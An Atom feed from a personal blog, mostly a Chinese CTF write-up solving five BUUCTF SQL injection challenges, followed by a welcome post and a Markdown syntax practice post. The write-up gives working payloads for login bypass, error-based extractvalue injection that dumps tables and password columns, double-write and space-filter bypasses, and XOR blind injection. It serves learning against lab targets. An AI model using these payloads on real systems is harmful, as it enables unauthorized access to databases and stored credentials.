    <entry>
        <id>http://imfanqie.top/2021/06/20/ctf/web/sql/(ctfwp)sql%E6%B3%A8%E5%85%A5%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</id>
        <title>(ctfwp)sql注入极客大挑战</title>
        <link rel="alternate" href="http://imfanqie.top/2021/06/20/ctf/web/sql/(ctfwp)sql%E6%B3%A8%E5%85%A5%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"/>
        <content type="html">&lt;p&gt;buuctf 极客大挑战系列    &lt;em&gt;&lt;strong&gt;sql 注入&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;no1-easysql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#no1-easysql&#34;&gt;#&lt;/a&gt; NO.1 EasySQL&lt;/h1&gt;
&lt;p&gt;题目如图：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/WpYK2Efg3AdRjmQ.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;先尝试 万能密码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&#39; or 1=1 #
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;结果一步得出答案...&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/dbyFfuNm2zwakrR.png&#34; alt&gt;&lt;/p&gt;
&lt;h1 id=&#34;no2-lovesql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#no2-lovesql&#34;&gt;#&lt;/a&gt; NO.2 LoveSQL&lt;/h1&gt;
&lt;p&gt;题目同上，没变化&lt;/p&gt;
&lt;p&gt;尝试万能密码，找不到有效信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/n48LUG1k6oxVlQZ.png&#34; alt&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;尝试报错注入，寻找其他库 / 表：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;and extractvalue(1,concat(&#39;~&#39;,database()))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;顺利得到库名  geek&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/dxiaXFQqB6copZ8.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;尝试爆表名：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;and extractvalue(1,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&amp;quot;geek&amp;quot;)))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;显示 结果超过一行（&lt;em&gt;Subquery returns more than 1 row&lt;/em&gt;），添加 group_connat ()  函数解决。&lt;/p&gt;
&lt;p&gt;所以，输入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;and extractvalue(1,concat(&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&amp;quot;geek&amp;quot;)))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到表名 geekuser,l0ve1ysq1&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/ovuePtbscGk158j.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;尝试查表名，目测是第二个&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;and extractvalue(1,concat(&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&amp;quot;l0ve1ysq1&amp;quot;)))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到列名 id,username,password&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/mvNYQMGoLOA5p1Z.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;尝试获取信息&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;and extractvalue(1,concat(&#39;~&#39;,(select concat_ws(&#39;~&#39;,id,username,password) from l0ve1ysq1 where id=1)))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/AgwbOVam5cB9FL2.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;又查了几个 id 全是废话，直接爆破吧&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/Vh2jGA1lX8Bbcra.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/YED6Lb78eqnlk3P.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;爆破得出 id=16 处有 flag 没显示全&lt;/p&gt;
&lt;p&gt;前半段&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;and extractvalue(1,concat(&#39;~&#39;,(select concat_ws(&#39;~&#39;,id,username,password) from l0ve1ysq1 where id=16)))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;后半段&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;and extractvalue(1,concat(&#39;~&#39;,(select substr(password,15,30) from l0ve1ysq1 where id=16)))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/RXhfU2r8d7GS5CJ.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/fE68FvYXnRwVHOu.png&#34; alt&gt;&lt;/p&gt;
&lt;p fd752c8f-8f92-4b6f-93fa-0f99791741f0&gt;得  flag&lt;/p&gt;
&lt;h1 id=&#34;no3-babysql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#no3-babysql&#34;&gt;#&lt;/a&gt; NO.3 BabySQL&lt;/h1&gt;
&lt;p&gt;老方法 万能密码走一遍，果然不行～&lt;/p&gt;
&lt;p&gt;选择做 FUZZ 模糊测试&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/5QcO4CZGnb3827r.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;不难发现 len 726 长度都被过滤成空 &#39;&#39;  所以显示没有输入，&lt;/p&gt;
&lt;p&gt;而 len 751 都没有被过滤，&lt;/p&gt;
&lt;p&gt;这种过滤比较简单，所以直接考虑 &lt;strong&gt;双写绕过&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;通过报错注入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;oorr extractvalue(1,concat(0x7e,database()))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到库名 geek&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/EwS3ozTF86MCPlX.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;继续爆表名&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; **1&#39;oorr extractvalue(1,concat(0x7e,(seselectlect group_concat(table_name)frfromom infoorrmation_schema.tables whwhereere table_schema=&amp;quot;geek&amp;quot;)))#**     
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到表名 b4bsql,geekuser&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/QRAtL1B9Y4HTzeC.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;继续爆列名&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;oorr extractvalue(1,concat(0x7e,(seselectlect group_concat(column_name)frfromom infoorrmation_schema.columns whwhereere table_name=&amp;quot;b4bsql&amp;quot;)))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到列名 id,username,password&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/iJrnc8s1ZC9DmOE.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;查询数据&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;oorr extractvalue(1,concat(0x7e,(seselectlect concat_ws(0x7e,id,username,passwoorrd)frfromom b4bsql whwhereere id=1)))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;同上，又是一堆废话，直接爆破，得到 id=8 时有 flag&lt;/p&gt;
&lt;p&gt;剩下步骤同上一题&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/hmtXv7jqnHWZEyD.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;后半部分&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;oorr extractvalue(1,concat(0x7e,(seselectlect subsubstrstr(passwoorrd,15,30)frfromom b4bsql whwhereere id=8)))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/kwTh4E9IocVQnjq.png&#34; alt&gt;&lt;/p&gt;
&lt;p 50ba0844-d76f-4a9a-892f-bc7694528c7e&gt;得 flag&lt;/p&gt;
&lt;h1 id=&#34;no4-hardsql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#no4-hardsql&#34;&gt;#&lt;/a&gt; NO.4 HardSQL&lt;/h1&gt;
&lt;p&gt;万能密码走一下，失败&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/1ujeGcFz4nrv9l8.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;直接做 FUZZ 模糊测试&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/aOWItfx6iXPKBLk.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;如图，len 736 都被屏蔽了&lt;/p&gt;
&lt;p&gt;len 751 没被屏蔽，另外空格在实际输入中也被屏蔽了，所以空格用括号代替。&lt;/p&gt;
&lt;p&gt;尝试报错注入 **1&#39;or (extractvalue (1,concat (0x7e,database ())))#&lt;/p&gt;
&lt;p&gt;顺利得到库名  geek&lt;/p&gt;
&lt;p&gt;图同上，略&lt;/p&gt;
&lt;p&gt;尝试爆表名&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;or(extractvalue(1,concat(0x7e,(select(table_name)from(information_schema.tables)where((table_schema)like(&amp;quot;geek&amp;quot;))))))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/CQiELuMz7jtF2so.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;得到表名 H4rDsq1&lt;/p&gt;
&lt;p&gt;尝试爆列名&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&amp;quot;H4rDsq1&amp;quot;))))))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得 id,username,password&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/htNaUBxYRCwlbjA.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;查找信息&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;or(extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1)where((id)like(1))))))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得 flag 前半段&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/ud8L5Atv7VyNWDr.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;查后半段&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&#39;or(extractvalue(1,concat(0x7e,(select(right(password,20))from(H4rDsq1)where((id)like(1))))))#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/iTfcx8pwQymJELM.png&#34; alt&gt;&lt;/p&gt;
&lt;p 7725665e-c9b1-4558-b610-12bcccca00ce&gt;flag&lt;/p&gt;
&lt;h1 id=&#34;no5-finalsql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#no5-finalsql&#34;&gt;#&lt;/a&gt; NO.5 FinalSQL&lt;/h1&gt;
&lt;p&gt;根据界面提示 本题可能为 sql 盲注&lt;/p&gt;
&lt;p&gt;所以先做 FUZZ 测试&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/4ZANYOqju3s2Q5D.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;可以发现，大部分语句被屏蔽，选择盲注。而点击 1 时，发现&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/PjHnSoRyGIzful8.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;而输入 7 时&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/6mrzhnEpSalgkcj.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;输入更大的超范围数同理，发现注入点&lt;/p&gt;
&lt;p&gt;用 FUZZ 测试，个别未被屏蔽，但报错信息被屏蔽&lt;/p&gt;
&lt;p&gt;最后我选择用异或 ^ 注入进行盲注：&lt;/p&gt;
&lt;p&gt;1^(sql 注入判断语句)&lt;/p&gt;
&lt;p&gt;如果显示（NO！），说明 id=1，进一步说明 sql 判断语句为 假&lt;/p&gt;
&lt;p&gt;如果显示（ERROR!!!），说明 id=0，进一步说明 sql 判断语句为 真&lt;/p&gt;
&lt;p&gt;写一个 py 跑&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/8eQaT7fqMnkXoHw.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;同理将 datebase () 替换为&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;geek&#39;))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;再跑&lt;img data-src=&#34;https://i.loli.net/2021/06/21/sAeB49aCkdF6o5S.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;再换为&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#39;F1naI1y&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;再跑&lt;img data-src=&#34;https://i.loli.net/2021/06/21/dEXI6OGoaJPCrHB.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;再换&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(select(group_concat(passVord))from(F1naI1y))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;再跑&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/21/sGXtSlRV7PMuaK5.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;得出 flag&lt;/p&gt;
&lt;h1 id=&#34;总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h1&gt;
&lt;p&gt;写了一下午，当然，总结出一些 sql 相关的东西&lt;/p&gt;
&lt;p&gt;1. 页面上有显示位时，用联合注入 union；页面上没有显示位，但是有 SQL 语句执行错误信息输出时用报错注入&lt;/p&gt;
&lt;p&gt;2. 联合查询 先判断整型还是字符型，order by 查列数，获取库名，获取表名，获取字段名，获取数据&lt;/p&gt;
&lt;p&gt;3. 报错注入不用查列数，直接通过 extractvalue 函数报错查信息&lt;/p&gt;
&lt;p&gt;4. 当有绕过时，进行模糊测试，考虑是否为 双写绕过或空格绕过&lt;/p&gt;
&lt;p&gt;5. 若都不是，找可注入点进行盲注，一般这种题都会有可注入点让我们下手。盲注写 py 暴力破解即可。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;END&lt;/p&gt;
</content>
        <category term="sql" />
        <updated>2021-06-20T09:25:52.913Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/06/16/running%20till%20the%20sun%20goes%20down/</id>
        <title>Running Till The Sun Goes Down</title>
        <link rel="alternate" href="http://imfanqie.top/2021/06/16/running%20till%20the%20sun%20goes%20down/"/>
        <content type="html">&lt;p&gt;welcome to my blog, I&#39;m Fanqie！&lt;/p&gt;
&lt;p&gt;查文章请看目录或搜索&lt;/p&gt;
&lt;p&gt;Then 友链贴了大佬和队友的博客&lt;/p&gt;
&lt;p&gt;And 网址有好东西～～&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;请点击   more   阅读&lt;/p&gt;
</content>
        <updated>2021-06-16T08:45:29.595Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/06/16/(Test)%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8Bmarkdown%E8%AF%AD%E6%B3%95/</id>
        <title>（Test）markdown语法复习</title>
        <link rel="alternate" href="http://imfanqie.top/2021/06/16/(Test)%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8Bmarkdown%E8%AF%AD%E6%B3%95/"/>
        <content type="html">&lt;p&gt;测试一下 blog，顺便复习一下 md 语法。&lt;/p&gt;
&lt;p&gt;测试软件为 Typora&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;一-标题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-标题&#34;&gt;#&lt;/a&gt; 一、标题&lt;/h2&gt;
&lt;p&gt;、#  这是一级标题&lt;/p&gt;
&lt;p&gt;、## 这是二级标题&lt;/p&gt;
&lt;p&gt;、### 这是三级标题&lt;/p&gt;
&lt;p&gt;、#### 这是四级标题&lt;/p&gt;
&lt;p&gt;、##### 这是五级标题&lt;/p&gt;
&lt;p&gt;、###### 这是六级标题&lt;/p&gt;
&lt;h2 id=&#34;二-字体&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-字体&#34;&gt;#&lt;/a&gt; 二、字体&lt;/h2&gt;
&lt;p&gt;加粗   &lt;strong&gt;这是加粗文字&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;要加粗的文字左右分别用两个&lt;/em&gt;号包起来&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;倾斜   &lt;em&gt;这是倾斜文字&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;要倾斜的文字左右分别用一个&lt;/em&gt;号包起来&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;斜体加粗  &lt;em&gt;&lt;strong&gt;这是斜体加粗文字&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;要倾斜和加粗的文字左右分别用三个&lt;/em&gt;号包起来&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;删除线   &lt;s&gt;这是加线文字&lt;/s&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;要加删除线的文字左右分别用两个～～号包起来&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;三-引用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三-引用&#34;&gt;#&lt;/a&gt; 三、引用&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;在引用的文字前加 &amp;gt; 即可。引用也可以嵌套，如加两个 &amp;gt;&amp;gt; 三个 &amp;gt;&amp;gt;&amp;gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;lt;u&amp;gt; 这是引用的内容 &amp;lt;/u&amp;gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;lt;u&amp;gt; 这是引用的内容 &amp;lt;/u&amp;gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;lt;u&amp;gt; 这是引用过的内容 &amp;lt;/u&amp;gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;这是引用的内容。。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;四-分割线&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#四-分割线&#34;&gt;#&lt;/a&gt; 四、分割线&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;三个或者三个以上的 - 或者 * 都可以。&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;hr&gt;
&lt;h2 id=&#34;五-图片&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#五-图片&#34;&gt;#&lt;/a&gt; 五、图片&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;格式：![图片 alt](图片地址 &#39;&#39; 图片 title&#39;&#39;)&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;图片 alt 就是显示在图片下面的文字，相当于对图片内容的解释。&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;图片 title 是图片的标题，当鼠标移到图片上时显示的内容。title 可加可不加。&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;示例&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img1.lukou.com/static/p/blog/medium/0028/80/66/63/28806663.jpg&#34; alt=&#34;111.jpg&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;六-超链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#六-超链接&#34;&gt;#&lt;/a&gt; 六、超链接&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;[超链接名] (超链接地址 &amp;quot;超链接 title&amp;quot;)&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;去掉 ] 后的空格，title 可加可不加！&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly8yNzQwOTA4OTExLmdpdGh1Yi5pbw==&#34;&gt;高萌的博客&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;七-列表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#七-列表&#34;&gt;#&lt;/a&gt; 七、列表&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;语法： 无序列表用 - + * 任何一种都可以&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;列表内容 （-）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;列表内容 （+）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;列表内容 （*）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;（三种列表）&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;列表嵌套&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;上一级和下一级之间敲三个空格即可&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;八-表格&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#八-表格&#34;&gt;#&lt;/a&gt; 八、 表格&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;表头&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;表头&lt;/th&gt;
&lt;th style=&#34;text-align:right&#34;&gt;表头&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;内容&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;内容&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;内容&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;内容&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;内容&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;内容&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;直接从段落插入 更快一些。&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;九-代码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#九-代码&#34;&gt;#&lt;/a&gt; 九、代码&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;单行代码：代码之间分别用一个反引号包起来&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;(`) 不用加括号&lt;/p&gt;
&lt;p&gt;&lt;code&gt; printf(&amp;quot;hello world\n&amp;quot;);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;代码块：代码之间分别用三个反引号包起来，且两边的反引号单独占一行&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;(```)，结尾同理，不用加括号&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;​																												E N D&lt;/p&gt;
</content>
        <category term="随笔" />
        <updated>2021-06-16T08:24:31.783Z</updated>
    </entry>
</feed>
